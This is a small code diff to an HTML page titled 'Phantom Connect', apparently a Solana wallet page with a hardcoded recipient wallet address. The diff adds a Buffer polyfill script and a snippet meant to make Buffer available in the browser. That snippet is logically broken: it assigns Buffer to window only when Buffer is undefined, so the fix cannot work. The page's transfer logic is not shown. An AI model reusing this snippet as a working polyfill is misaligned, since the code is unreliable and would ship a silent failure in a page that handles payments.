@@ -5,6 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Connect</title>
+    <!-- Carica il polyfill per Buffer -->
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <!-- Carica la libreria Solana Web3 -->
     <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.js"></script>
     <style>
         body {
@@ -65,6 +68,11 @@
     </div>
 
     <script>
+        // Assicurati che Buffer sia disponibile nel browser
+        if (typeof Buffer === "undefined") {
+            window.Buffer = Buffer;
+        }
+
         let senderPublicKey = null; 
         const recipientAddress = "AbkmJwcuCwj6zcCNkoQmStTMhFLe4CwTS3p4g8nnScue";
 
@@ -122,7 +130,6 @@
     </script>
 </body>
 </html>
-
 
 
 
